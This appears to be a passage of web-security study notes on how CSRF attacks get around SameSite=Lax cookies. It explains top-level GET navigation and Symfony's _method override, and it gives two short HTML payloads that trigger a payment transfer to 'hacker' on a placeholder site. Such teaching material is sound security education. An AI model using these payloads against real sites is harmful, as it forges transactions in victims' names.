In practice, servers aren't always fussy about whether they receive a `GET` or `POST` request to a given endpoint, even those that are expecting a form submission. 

If they also use `Lax` restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by [eliciting](https://translate.google.com/?sl=en&tl=ar&text=eliciting&op=translate) a `GET` request from the victim's browser.

As long as the request involves a top-level navigation, the browser will still include the victim's session cookie.

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line.

For example, `Symfony` (`Symfony` is a **PHP framework** used for building  web applications) supports the `_method` parameter in forms, which takes [precedence](https://translate.google.com/?sl=en&tl=ar&text=precedence&op=translate) over the normal method for routing purposes:
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
Other frameworks support a variety of similar parameters.
